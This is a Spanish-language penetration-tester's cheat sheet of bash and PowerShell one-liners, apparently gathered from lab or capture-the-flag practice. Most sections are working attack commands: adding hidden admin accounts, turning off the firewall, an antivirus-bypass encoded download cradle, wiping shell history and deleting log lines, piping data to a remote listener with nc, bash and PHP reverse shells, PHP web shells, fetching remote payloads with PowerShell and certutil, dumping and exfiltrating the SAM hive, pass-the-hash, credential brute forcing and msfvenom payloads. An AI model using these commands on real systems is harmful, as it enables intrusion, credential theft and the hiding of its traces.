# Notas bash/powershell
## Ayuda memoria con comando en bash/powershell

-----Powershell-----
net user USUARIO PASSWORD /add --> crea una cuenta "usuario" con password "pass123"
net localgroup administradores USUARIO /add --> agrega al usuario "usuario" al grupo administradores
net share NAME=C:\ /GRANT:sistemas,FULL --> comparte una carpeta (C:\) con el nombre NAME y le concede todos los permisos al usuario 
copy \\IP\SHARE\FILE FILE
plink.exe -l "user" -pw "pass" -R port:127.0.0.1:port

-----Firewall-rules-----
netsh advfirewall firewall add rule name=NAME protocol=PROTO dir=in localport=PORT action=allow
netsh advfirewall firewall add rule name=NAME protocol=PROTO dir=out localport=PORT action=allow
netsh advfirewall firewall set allprofiles state off
netsh advfirewall firewall delete rule name=NAME

-----Activar-RDP-----
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

-----AV bypass-------
A>echo "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.6:8000/attack.txt')" | iconv --to-code UTF-16LE | base64 -w 0
V>powershell -EncodedCommand "base64-string"

----History----
export HISTTIMEFORMAT='%F %T '
export HISTFILE=/dev/null
shopt -s HISTAPPEND

----Bash-----
ln -s -f /dev/null .bash_history

cat /etc/login.defs | grep "ENCRYPT_METHOD"
cat file | tr '[A-Z]' '[a-z]'
cat file | grep ::: | awk -F: '{print $1":"$4}'
cat file | grep -a string | awk '{print $2}' | awk -F@ '{print $1}'
cat file | xclip -sel clip
cat file | sed 's/ /+/g'
cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
cat /proc/net/tcp | awk '{print $2}'| sort -u | grep -v "local" | awk '{print $2}' FS=':'

time find . -type f -iname "*.txt" | grep -v "local"
find \-name *config*.php | xargs cat | grep -i -E "db-pass|db-user"
find . -type d -exec touch {}/FILE \;
find . | grep exe$
find \-user user 2>/dev/null | grep -vE 'proc|config'
find . -ls -type f
find . -type d | while read DIRECTORY; do echo ${DIRECTORY} | grep php; done

tr '\n' ',' < tplinkList.txt
tr -d '\"' | tr ';' '\n'

sed -i '/192\.168\.0\.1/d' /var/log/messages.log --> elimina todas las lineas que contienen la ip

uname -a | nc 10.8.23.159 9000

mkfifo input; tail -f input | /bin/sh 2>/dev/null > output
arp-scan --interface INTERFACE ip/cidr
arp-scan -q -l --interface INTERFACE | grep -i "MAC"
rlwrap nc -lnvp 'port'

awk '{print "https://" $1}'
awk '{print $1 ".yahoo.com"}'

xargs -n1 -P10 ./sh
ping -c ip -R // muestra ruta del ping hasta el destino
kill -9 $(jobs -p) 
hostname -I
cut -d; -f3 < !$
wget -r ftp://user@ip
wget -r --no-parent URL --reject="STRING"
watch -d ls /var

touch {/folder1/,./}file.{exe,dll,txt}
evil-winrm -i IP -u USER -p PASS
xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103

echo 'b64-string' | base64 -d | xxd -ps -r; echo
echo !:2-3 -->rango de argumentos
echo !$ --> ultimo argumento
echo !^ --> primer argumento
echo !* --> todos los argumentos

curlftpfs user:pass@ip $(pwd)
curlftpfs -o allow_other user:pass@ip $(pwd)
curl -# --upload-file -F file=@FILE URL
curl -U "user" --referer URL-SRC URL-DST

openssl password
davtest -url http://10.10.169.131/webdav -auth wampp:xampp -uploadfile shell.php -uploadloc DavTestDir_tWNxgBo7pob5I2h

-----iptables-------
iptables -I DOCKER-USER -i "int" -p tcp --dport "port" -j DROP --> nmap filtered 
iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --> nmap closed
iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> nmap closed y no aparece en escaneo
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -s 192.168.1.104 -j ACCEPT --> acepta solo tráfico de la siguiente IP
iptables -A INPUT -s 192.168.1.102 -j DROP --> bloquea tráfico de la siguiente IP
iptables -A INPUT -p icmp -i eth0 -j DROP --> bloqueo de ping en la interface

-----SSH--------
ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT user@REMOTE-IP -fNT --> para no abrir tty en equipo remoto
ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@REMOTE-IP

------Host-recon-----
nmap -p1-10 IP --reason // muestra el estado del puerto 
nmap --script="ssl*" IP
nmap --script="rdp-vuln-ms12-020"
nmap -top-ports 5000 --open -T5 -sU IP -oN scanUDP
nmap -p445 --scripts "vuln and safe" IP -oN vuln.nmap
nmap --script smb-enum-share -p PORTS IP
 
wpscan -e u,vp --url "http://ip" --proxy http://127.0.0.1:8080 
smbget -R smb://IP/FOLDER -U USER
smbclient -N //IP -c "DIR"
smbclient -L //IP -L
smbclient -L //IP/FOLDER --option='client min protocol=NT1' -N
rpcclient -u '' -c "enumdomusers" -N

------Brute-force-------------
ncrack -vv -U "user.lst" -P "pass.lst" ip:port
hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> hydra crea su diccionario para ataque con números, min+may, simbolos
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.137.91:21 -vV
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.179.73 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -vV
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.179.73
hashcat --user -m 1000 hash lst -r rules/InsidePro-PasswordsPro.rule -r rules/base64.rule
hashcat --examples-hashes | grep 'mode'
hashcat --force --stdout dictionario.lst -r /usr/share/hashcat/rules/best64.rule
zip2john 8702.zip
fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 8702.zip
wfuzz -c -L --hc=404 -w WORDLIST TARGET --> L=recursivo 
wfuzz -c --hc=404 -w WORDLIST -w WORDLIST2 url/FUZZ/FUZ2Z
ffuf -c -w WORDLIST -u URL
crunch 15 15 -t STRING+pattern --> pattern @lowercase ,uppercase %numbers ^symbols

------Samba-recon---------
crackmapexec smb ip --pass-pol -u 'user' -p 'pass'
crackmapexec smb ip -u 'user' -p 'pass'
crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
crackmapexec smb ip -u 'user' -p 'pass' --shares
crackmapexec smb ip -u 'user' -p 'pass' --lsa
crackmapexec smb ip -u 'user' -p 'pass' --sam
crackmapexec smb ip -u 'user' -p 'pass' -x 'CMD'
crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'
crackmapexec smb ip -u LIST -p PASS --continue-on-success
crackmapexec smb ip -u DICT -p DICT

impacket-smbserver testingSMB $(pwd) -smb2support -u USUARIO -p PASSWORD
psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
psexec.py 'user:pass@ip'
psexec.py WORKGROUP/user:pass@ip CMD
smbmap -H host -u 'null'
smbcalcs //IP/COMPARTIDA carpeta -N 
pth-winexe -U domain/user%pass //IP CMD
pth-winexe -U domain/user%hash //IP CMD

------Powershell shares------
PS> $pass=convertto-securestring 'pass' -AsPlainText -Force
PS> $pass 
PS> $creds=New-Object System.Management.Automation.PSCredential('user', $pass)
PS> $creds 
PS> New-PSDrive -Name NAME -PSProvider FileSystem -Credential $creds -Root \\IP\COMPARTIDA
PS> cd COMPARTIDA:

-----bash oneLiners-----
for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done
for i in {1..20}; do curl http://192.168.46.5/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done //enumeración de users
for i in $(seq 1 10); do ping -c 1 mnba-biblio-0$i; done
for i in $(cat dictionario.lst); do echo $i; echo ${i}\!; done
for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done
while read SHAREDFOLDER; do echo "===${sharedFolder}==="; smbclient "//ip/${sharedFolder} -N -c dir; echo; done"
while read line;do echo $line; done | xargs ls -l

--------SAM dump---------------
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup
copy sam.backup \\IP\smbfolder\sam
copy system.backup \\IP\smbfolder\system
pwdump system sam

-----tty upgrade------
python -c 'import pty; pty.spawn("/bin/bash")'
V>ctrl-Z --> background sesion
A>stty size
A>stty raw -echo
A>fg 1 --> foreground sesion
V>stty row "x" cols "x"

----tty-interactive-----
script /dev/null -c  bash
bash -i >& /dev/tcp/ip/puerto 0>&1
mkfifo input; tail -f input | /bin/bash > output

----PowerShells-----
powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
certutil.exe -f -urlcache -split http://ip/file file

-----php-------
<?php system($_GET['cmd']);?>
<?php system('ls -la');?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
<?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php");?>
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";?>

----Tmux----------
tmux new -s "nombre"
tmux kill-window -t "n"
prefix + space --> mueve los paneles
prefix + q --> muestra los IDs de los paneles
prefix + x --> cierra los paneles
prefix + ! --> mueve el panel activo a una nueva ventana
prefix + [ + / --> para buscar texto

----Tmux copy mode-----
prefix + [ 
prefix + space
prefix + w
prefix + ]
----------

----msfvenom----
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=IP -e x86/shikata_ga_nai -i 10 -f raw > FILE.bin
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=IP -f raw

----mysql----
mysql -u USER -p PASS -P CMD
mysqlshow -u USER -p PASS DATABASE TABLES
mysqldump -u USER --password=PASS --single-transaction --all-databases
mysqldump -u USER --password=PASS --no-data TABLES
sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
